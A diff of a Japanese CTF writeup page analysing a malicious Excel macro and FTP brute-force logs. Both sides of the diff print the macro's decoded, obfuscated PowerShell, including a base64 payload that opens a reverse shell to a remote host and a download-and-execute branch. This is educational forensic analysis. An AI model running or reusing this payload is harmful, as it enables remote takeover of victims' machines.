@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.74.2 with theme even" />
+<meta name="generator" content="Hugo 0.119.0 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/rcts_cert_ctf_2021/" />
@@ -35,24 +35,20 @@
 
 
 
-<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link href="https://captureamerica.github.io/writeups/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
 
 
 
 <meta property="og:title" content="RCTS CERT CTF 2021 Writeup" />
 <meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://defendingthesoc.ctf.cert.rcts.pt/challenges 年休を取った日にちょうどやってたCTFに参加しました。簡単なのも多かったけど、VMを使ったチャレンジとかがあっ" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/rcts_cert_ctf_2021/" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/rcts_cert_ctf_2021/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2021-08-13T18:00:00+09:00" />
 <meta property="article:modified_time" content="2021-08-13T18:00:00+09:00" />
 <meta itemprop="name" content="RCTS CERT CTF 2021 Writeup">
-<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://defendingthesoc.ctf.cert.rcts.pt/challenges 年休を取った日にちょうどやってたCTFに参加しました。簡単なのも多かったけど、VMを使ったチャレンジとかがあっ">
-<meta itemprop="datePublished" content="2021-08-13T18:00:00&#43;09:00" />
-<meta itemprop="dateModified" content="2021-08-13T18:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="7158">
-
-
-
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://defendingthesoc.ctf.cert.rcts.pt/challenges 年休を取った日にちょうどやってたCTFに参加しました。簡単なのも多かったけど、VMを使ったチャレンジとかがあっ"><meta itemprop="datePublished" content="2021-08-13T18:00:00+09:00" />
+<meta itemprop="dateModified" content="2021-08-13T18:00:00+09:00" />
+<meta itemprop="wordCount" content="7178">
 <meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="RCTS CERT CTF 2021 Writeup"/>
 <meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://defendingthesoc.ctf.cert.rcts.pt/challenges 年休を取った日にちょうどやってたCTFに参加しました。簡単なのも多かったけど、VMを使ったチャレンジとかがあっ"/>
@@ -242,7 +238,7 @@
 <p>URL: <a href="https://defendingthesoc.ctf.cert.rcts.pt/challenges">https://defendingthesoc.ctf.cert.rcts.pt/challenges</a>
 <br /><br />
 年休を取った日にちょうどやってたCTFに参加しました。簡単なのも多かったけど、VMを使ったチャレンジとかがあって結構楽しかったし、勉強にもなったので参加できてよかったです。</p>
-<p><br /></p>
+<br />
 <p>1700点を獲得し、66位でした。</p>
 <img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_Score1.png" alt="rcts_cert_CTF_2021_Score1.png">
 <p><br><br></p>
@@ -272,15 +268,15 @@ Can you check if this was used to gain a foothold in our network?</p>
 <ul>
 <li>Account_report.xlsm</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution">Solution</h3>
 <p>ファイル・タイプは以下の通り。</p>
 <pre>
 $ file Account_report.xlsm
 Account_report.xlsm: Microsoft Excel 2007+
 </pre>
-<p><br />
-olevbaでマクロが確認できます。</p>
+<br />
+olevbaでマクロが確認できます。
 <pre>
 $ olevba Account_report.xlsm
 olevba 0.56.2 on Python 2.7.18 - http://decalage.info/python/oletools
@@ -362,14 +358,14 @@ End Function
 
 ...(snip)...
 </pre>
-<p><br /></p>
+<br />
 <p>Libre Officeなどで開いても確認できます。</p>
 <img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_Libre.png" alt="rcts_cert_CTF_2021_Libre.png">
-<p><br /></p>
+<br />
 <p>デコードすると、Shell関数の引数には、<code>powershell.exe -exec bypass -noexit -w hidden -enc &lt;データ&gt;</code> となっており、データ部分をデコードすると以下になります。ここで、黄色でハイライトした部分にフラグっぽい文字列があるのがわかります。ここからフラグが取れるので、Windowsマシンでの実行は不要です。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -390,28 +386,28 @@ End Function
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$t</span> <span class="p">=</span> <span class="s1">&#39;[DllImport(\&#34;user32dll\&#34;)] public static extern bool ShowWindow(int handle, int state);&#39;</span><span class="p">;</span>
-
-<span class="nb">add-type</span> <span class="n">-name</span> <span class="n">win</span> <span class="n">-member</span> <span class="nv">$t</span> <span class="n">-namespace</span> <span class="n">native</span><span class="p">;</span><span class="no">[nativewin]</span><span class="p">::</span><span class="n">ShowWindow</span><span class="p">((</span><span class="no">[SystemDiagnosticsProcess]</span><span class="p">::</span><span class="n">GetCurrentProcess</span><span class="p">()</span> <span class="p">|</span> <span class="nb">Get-Process</span><span class="p">)</span><span class="n">MainWindowHandle</span><span class="p">,</span> <span class="n">0</span><span class="p">);</span>
-
-<span class="hl"><span class="nb">iex </span><span class="p">(</span> <span class="no">[StrinG]</span><span class="p">::</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="p">(</span><span class="no">[rEGeX]</span><span class="p">::</span><span class="n">MaTcheS</span><span class="p">(</span> <span class="s2">&#34;) &#39;x&#39;+]31[DIlLeHs$+]1[DiLLehs$ (&amp;| )431[DIlLeHs$+]1[DiLLehs$ (&amp;| )43]RAhc[]GnIRTs[,&#39;tXj&#39;(ecALPER)&#39;$&#39;,&#39;wqi&#39;(eCALPER)&#39;;tX&#39;+&#39;jsc0d_d3lb4n3_0rc4m&#39;+&#39;{g&#39;+&#39;a&#39;+&#39;lftXj &#39;+&#39;=1_ga&#39;+&#39;lfwqi&#39;(&#34;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;R&#39;</span><span class="p">+</span><span class="s1">&#39;iGHTtOl&#39;</span><span class="p">+</span><span class="s1">&#39;eft&#39;</span> <span class="p">)</span> <span class="p">|</span> <span class="k">forEAcH</span><span class="n">-oBJecT</span> <span class="p">{</span><span class="nv">$_VALUE</span><span class="p">}</span> <span class="p">))</span> <span class="p">);</span>
-</span>
-<span class="hl"><span class="nb">SEt </span><span class="p">(</span><span class="s2">&#34;G8&#34;</span><span class="p">+</span><span class="s2">&#34;h&#34;</span><span class="p">)</span> <span class="p">(</span> <span class="s2">&#34; ) )63]Rahc[,&#39;raZ&#39;EcalPeR- 43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )&#39;;2&#39;+&#39;N&#39;+&#39;1&#39;+&#39;}su0r3g&#39;+&#39;n4d_3r4&#39;+&#39;_2N1 = 2_ga&#39;+&#39;lfr&#39;+&#39;aZ&#39;(( ( )&#39;&#39;niOj-&#39;x&#39;+]3,1[)(GNirTSotEcNereFeRpEsOBREv$ (  &#34;</span>  <span class="p">)</span> <span class="p">;</span><span class="n">-jOIn</span> <span class="p">(</span> <span class="nb">lS </span><span class="p">(</span><span class="s2">&#34;VAR&#34;</span><span class="p">+</span><span class="s2">&#34;IaB&#34;</span><span class="p">+</span><span class="s2">&#34;LE:g&#34;</span><span class="p">+</span><span class="s2">&#34;8H&#34;</span><span class="p">)</span>  <span class="p">)</span><span class="n">VALue</span><span class="p">[</span> <span class="p">-</span> <span class="n">1</span> <span class="p">-</span> <span class="p">(</span> <span class="p">(</span> <span class="nb">lS </span><span class="p">(</span><span class="s2">&#34;VAR&#34;</span><span class="p">+</span><span class="s2">&#34;IaB&#34;</span><span class="p">+</span><span class="s2">&#34;LE:g&#34;</span><span class="p">+</span><span class="s2">&#34;8H&#34;</span><span class="p">)</span>  <span class="p">)</span><span class="n">VALueLengtH</span><span class="p">)]</span> <span class="p">|</span> <span class="nb">IeX
-</span></span><span class="nb"></span>
-<span class="nv">$payload</span> <span class="p">=</span> <span class="s2">&#34;JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMwAyACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApADsA&#34;</span>
-
-<span class="nv">$c</span> <span class="p">=</span> <span class="no">[SystemTextEncoding]</span><span class="p">::</span><span class="n">UnicodeGetString</span><span class="p">(</span><span class="no">[SystemConvert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$payload</span><span class="p">))</span>
-
-<span class="k">if</span> <span class="p">(</span><span class="nv">$payload</span> <span class="o">-match</span> <span class="s2">&#34;http:|https:&#34;</span><span class="p">)</span> <span class="p">{</span>
-
-   <span class="nv">$payload</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="s2">&#34;NetWebclient&#34;</span><span class="p">)</span><span class="n">DownloadString</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
-
-<span class="p">}</span>
-
-<span class="nb">iex </span><span class="nv">$c</span><span class="p">;</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$t</span> <span class="p">=</span> <span class="s1">&#39;[DllImport(\&#34;user32dll\&#34;)] public static extern bool ShowWindow(int handle, int state);&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">add-type</span> <span class="n">-name</span> <span class="n">win</span> <span class="n">-member</span> <span class="nv">$t</span> <span class="n">-namespace</span> <span class="n">native</span><span class="p">;[</span><span class="no">nativewin</span><span class="p">]::</span><span class="n">ShowWindow</span><span class="p">(([</span><span class="no">SystemDiagnosticsProcess</span><span class="p">]::</span><span class="n">GetCurrentProcess</span><span class="p">()</span> <span class="p">|</span> <span class="nb">Get-Process</span><span class="p">)</span><span class="n">MainWindowHandle</span><span class="p">,</span> <span class="mf">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line hl"><span class="cl"><span class="nb">iex </span><span class="p">(</span> <span class="p">[</span><span class="no">StrinG</span><span class="p">]::</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="p">([</span><span class="no">rEGeX</span><span class="p">]::</span><span class="n">MaTcheS</span><span class="p">(</span> <span class="s2">&#34;) &#39;x&#39;+]31[DIlLeHs$+]1[DiLLehs$ (&amp;| )431[DIlLeHs$+]1[DiLLehs$ (&amp;| )43]RAhc[]GnIRTs[,&#39;tXj&#39;(ecALPER)&#39;$&#39;,&#39;wqi&#39;(eCALPER)&#39;;tX&#39;+&#39;jsc0d_d3lb4n3_0rc4m&#39;+&#39;{g&#39;+&#39;a&#39;+&#39;lftXj &#39;+&#39;=1_ga&#39;+&#39;lfwqi&#39;(&#34;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;R&#39;</span><span class="p">+</span><span class="s1">&#39;iGHTtOl&#39;</span><span class="p">+</span><span class="s1">&#39;eft&#39;</span> <span class="p">)</span> <span class="p">|</span> <span class="nb">forEAcH-oBJecT</span> <span class="p">{</span><span class="nv">$_VALUE</span><span class="p">}</span> <span class="p">))</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line hl"><span class="cl"><span class="nb">SEt </span><span class="p">(</span><span class="s2">&#34;G8&#34;</span><span class="p">+</span><span class="s2">&#34;h&#34;</span><span class="p">)</span> <span class="p">(</span> <span class="s2">&#34; ) )63]Rahc[,&#39;raZ&#39;EcalPeR- 43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )&#39;;2&#39;+&#39;N&#39;+&#39;1&#39;+&#39;}su0r3g&#39;+&#39;n4d_3r4&#39;+&#39;_2N1 = 2_ga&#39;+&#39;lfr&#39;+&#39;aZ&#39;(( ( )&#39;&#39;niOj-&#39;x&#39;+]3,1[)(GNirTSotEcNereFeRpEsOBREv$ (  &#34;</span>  <span class="p">)</span> <span class="p">;</span><span class="n">-jOIn</span> <span class="p">(</span> <span class="nb">lS </span><span class="p">(</span><span class="s2">&#34;VAR&#34;</span><span class="p">+</span><span class="s2">&#34;IaB&#34;</span><span class="p">+</span><span class="s2">&#34;LE:g&#34;</span><span class="p">+</span><span class="s2">&#34;8H&#34;</span><span class="p">)</span>  <span class="p">)</span><span class="n">VALue</span><span class="p">[</span> <span class="p">-</span> <span class="mf">1</span> <span class="p">-</span> <span class="p">(</span> <span class="p">(</span> <span class="nb">lS </span><span class="p">(</span><span class="s2">&#34;VAR&#34;</span><span class="p">+</span><span class="s2">&#34;IaB&#34;</span><span class="p">+</span><span class="s2">&#34;LE:g&#34;</span><span class="p">+</span><span class="s2">&#34;8H&#34;</span><span class="p">)</span>  <span class="p">)</span><span class="n">VALueLengtH</span><span class="p">)]</span> <span class="p">|</span> <span class="nb">IeX
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">$payload</span> <span class="p">=</span> <span class="s2">&#34;JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMwAyACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApADsA&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="p">=</span> <span class="p">[</span><span class="no">SystemTextEncoding</span><span class="p">]::</span><span class="n">UnicodeGetString</span><span class="p">([</span><span class="no">SystemConvert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$payload</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$payload</span> <span class="o">-match</span> <span class="s2">&#34;http:|https:&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="nv">$payload</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="s2">&#34;NetWebclient&#34;</span><span class="p">)</span><span class="n">DownloadString</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">iex </span><span class="nv">$c</span><span class="p">;</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
-<p><br /></p>
+<br />
 <p><code>'R'+'iGHTtOl'+'eft'</code> (RightToLeft) があったり、<code>ecALPER</code> (Replace) のような反転された文字列があるので、Pythonで <code>[::-1]</code> を付けて一旦反転してみるともう少し見えてきます。（echo と rev でも反転できます。）</p>
 <pre>
 $ python3
@@ -422,8 +418,8 @@ $ python3
 >>> " ) )63]Rahc[,'raZ'EcalPeR- 43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )';2'+'N'+'1'+'}su0r3g'+'n4d_3r4'+'_2N1 = 2_ga'+'lfr'+'aZ'(( ( )''niOj-'x'+]3,1[)(GNirTSotEcNereFeRpEsOBREv$ (  "[::-1]
 "  ( $vERBOsEpReFereNcEtoSTriNG()[1,3]+'x'-jOin'') ( (('Za'+'rfl'+'ag_2 = 1N2_'+'4r3_d4n'+'g3r0us}'+'1'+'N'+'2;')  -cREplACe  ([chaR]49+[chaR]78+[chaR]50),[chaR]34 -RePlacE'Zar',[chaR]36) ) "
 </pre>
-<p><br />
-ちなみに、どの部分を反転させるのかは、色付きのエディタとかで見るとわかりやすいと思います。</p>
+<br />
+ちなみに、どの部分を反転させるのかは、色付きのエディタとかで見るとわかりやすいと思います。
 <img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_emacs.png" alt="rcts_cert_CTF_2021_emacs.png">
 <p><br /><br /></p>
 <p>文字列のReplaceや連結をすると、フラグは以下になります。</p>
@@ -443,13 +439,13 @@ Can you see what happened and if there was a host compromised?</p>
 <li>ftp.log （147行のログ）</li>
 <li>ssh.log （301行のログ）</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-1">Solution</h3>
 <p>ログの中から怪しいところを見つけるチャレンジです。</p>
 <p>ftp.log
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -463,25 +459,25 @@ Can you see what happened and if there was a host compromised?</p>
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="p">...(</span><span class="n">snip</span><span class="p">)...</span>
-<span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">2</span><span class="p">]</span> <span class="nl">CONNECT</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span>
-<span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">2</span><span class="p">]</span> <span class="nl">CONNECT</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span>
-<span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">1</span><span class="p">]</span> <span class="p">[</span><span class="n">ftp</span><span class="p">]</span> <span class="n">OK</span> <span class="nl">LOGIN</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span><span class="p">,</span> <span class="n">anon</span> <span class="n">password</span> <span class="s">&#34;04345678&#34;</span>
-<span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">1</span><span class="p">]</span> <span class="p">[</span><span class="n">ftp</span><span class="p">]</span> <span class="n">OK</span> <span class="nl">LOGIN</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span><span class="p">,</span> <span class="n">anon</span> <span class="n">password</span> <span class="s">&#34;daniel&#34;</span>
-<span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">1</span><span class="p">]</span> <span class="p">[</span><span class="n">ftp</span><span class="p">]</span> <span class="n">OK</span> <span class="nl">LOGIN</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span><span class="p">,</span> <span class="n">anon</span> <span class="n">password</span> <span class="s">&#34;abc043&#34;</span>
-<span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">1</span><span class="p">]</span> <span class="p">[</span><span class="n">ftp</span><span class="p">]</span> <span class="n">OK</span> <span class="nl">LOGIN</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span><span class="p">,</span> <span class="n">anon</span> <span class="n">password</span> <span class="s">&#34;nicole&#34;</span>
-<span class="hl"><span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">1</span><span class="p">]</span> <span class="p">[</span><span class="n">ftp</span><span class="p">]</span> <span class="n">OK</span> <span class="nl">LOGIN</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span><span class="p">,</span> <span class="n">anon</span> <span class="n">password</span> <span class="s">&#34;ZmxhZ3tzMG0zdGgxbmc=&#34;</span>
-</span><span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">1</span><span class="p">]</span> <span class="p">[</span><span class="n">ftp</span><span class="p">]</span> <span class="n">OK</span> <span class="nl">LOGIN</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span><span class="p">,</span> <span class="n">anon</span> <span class="n">password</span> <span class="s">&#34;rockyou&#34;</span>
-<span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">1</span><span class="p">]</span> <span class="p">[</span><span class="n">ftp</span><span class="p">]</span> <span class="n">OK</span> <span class="nl">LOGIN</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span><span class="p">,</span> <span class="n">anon</span> <span class="n">password</span> <span class="s">&#34;0434567&#34;</span>
-<span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">1</span><span class="p">]</span> <span class="p">[</span><span class="n">ftp</span><span class="p">]</span> <span class="n">OK</span> <span class="nl">LOGIN</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span><span class="p">,</span> <span class="n">anon</span> <span class="n">password</span> <span class="s">&#34;043456789&#34;</span>
-<span class="p">...(</span><span class="n">snip</span><span class="p">)...</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">...(</span><span class="n">snip</span><span class="p">)...</span>
+</span></span><span class="line"><span class="cl"><span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">2</span><span class="p">]</span> <span class="nl">CONNECT</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">2</span><span class="p">]</span> <span class="nl">CONNECT</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">1</span><span class="p">]</span> <span class="p">[</span><span class="n">ftp</span><span class="p">]</span> <span class="n">OK</span> <span class="nl">LOGIN</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span><span class="p">,</span> <span class="n">anon</span> <span class="n">password</span> <span class="s">&#34;04345678&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">1</span><span class="p">]</span> <span class="p">[</span><span class="n">ftp</span><span class="p">]</span> <span class="n">OK</span> <span class="nl">LOGIN</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span><span class="p">,</span> <span class="n">anon</span> <span class="n">password</span> <span class="s">&#34;daniel&#34;</span>
